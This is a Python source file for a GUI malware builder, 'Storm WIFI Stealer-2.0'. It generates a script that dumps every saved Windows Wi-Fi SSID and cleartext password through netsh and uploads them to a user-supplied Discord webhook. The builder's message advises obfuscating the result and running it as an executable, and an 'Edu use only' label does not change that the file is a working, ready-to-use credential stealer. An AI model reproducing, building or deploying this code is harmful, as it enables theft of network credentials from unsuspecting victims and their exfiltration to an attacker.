from customtkinter import *
from tkinter import messagebox
import os

def build():
    try:
        webhook_url = link.get()
        dots = "\""
        with open("Malware.py", "w") as f:
            f.write(f"""
import platform
import subprocess
import requests
import re
import os

webhook_url = {dots}{webhook_url}{dots}

def check_os():
    return os.name

def get_wifi_profiles():
    try:
        profiles_result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True)
        profiles = re.findall(r"All User Profile\\s*:\\s*(.*)", profiles_result.stdout)
        wifi_credentials = []

        for profile_name in profiles:
            profile_name = profile_name.strip()
            try:
                profile_details_result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name, "key=clear"], capture_output=True, text=True, check=True)
                
                password_search = re.search(r"Key Content\\s*:\\s*(.*)", profile_details_result.stdout)
                password = password_search.group(1).strip() if password_search else "No password found"
                
                wifi_credentials.append(f"SSID: {{profile_name}}, Password: {{password}}")

            except subprocess.CalledProcessError as e:
                print(f"Failed to retrieve profile for {{profile_name}}: {{e}}")

        with open("output.txt", "w") as f:
            for info in wifi_credentials:
                f.write(info + "\\n")

        with open("output.txt", 'rb') as file:
            payload = {{'content': 'User network info!'}}
            files = {{'file': file}}
            response = requests.post(webhook_url, data=payload, files=files)

        if response.status_code == 204:
            print("Successfully sent Wi-Fi info to the webhook.")
        else:
            print(f"Failed to send data, response status: {{response.status_code}}")

    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {{e}}")
def start():
    if check_os() == 'nt': 
        get_wifi_profiles()
    else:
        payload = {{'content': 'OS not supported'}}
        requests.post(webhook_url, data=payload)

start()
""")
        link.delete(0, END)
        m=messagebox.showinfo("storm wifi stealer","file created!\t\nuse storm PythonOBF to execute the malware as obf.exe")
    except Exception as error:
        print(f"An error occurred: {error}")

def exit_():
    message = messagebox.askquestion(title="Storm WIFI Stealer-2.0", message="Are you sure you want to exit?")
    if message == "yes":
        exit()

def start_():
    global link
    window = CTk()
    window.title("Storm WIFI Stealer-2.0")
    window.geometry("400x450+700+100")
    window.resizable(False, False)
    window.configure(fg_color="black")
    
    F_2 = CTkFrame(master=window, fg_color="black", height=260, width=270,
                   border_width=2, border_color="red", corner_radius=10)
    F_ = CTkFrame(master=window, fg_color="black", height=250, width=250,
                   border_width=2, border_color="red", corner_radius=12)
    
    # Labels and frame
    logo = CTkLabel(master=window, text="Storm", text_color="red", font=("bold", 40))
    logo2 = CTkLabel(master=window, text="WIFI-STEALER", text_color="white", font=("bold", 45))
    info = CTkLabel(master=window, text="discord: .6_g, Warning: Edu use only!", text_color="white", font=("bold", 10))
    label = CTkLabel(master=F_, text="Discord Webhook URL", text_color="red", font=("bold", 15))
    
    # Entry fields
    link = CTkEntry(F_, fg_color="black", border_width=2, border_color="red", height=50, 
                    placeholder_text_color="white", corner_radius=12, width=420, 
                    text_color="red", font=("", 15))

    button_ = CTkButton(F_, text="Build", fg_color="black", border_color="red", border_width=2,
                        hover_color="darkred", command=build)

    exit_button = CTkButton(F_, text="Exit", fg_color="black", border_color="red", border_width=2,
                            bg_color="black", hover_color="darkred", command=exit_)     

    # Pack and place
    label.place(x=55, y=20)
    link.place(x=-10, y=50)
    F_.pack(side='bottom', pady=20)
    logo.pack(side='top', pady=60)
    logo2.place(x=40, y=100)
    info.place(x=110, y=430)
    button_.place(x=55, y=170)
    exit_button.place(x=55, y=200)

    window.mainloop()

start_()
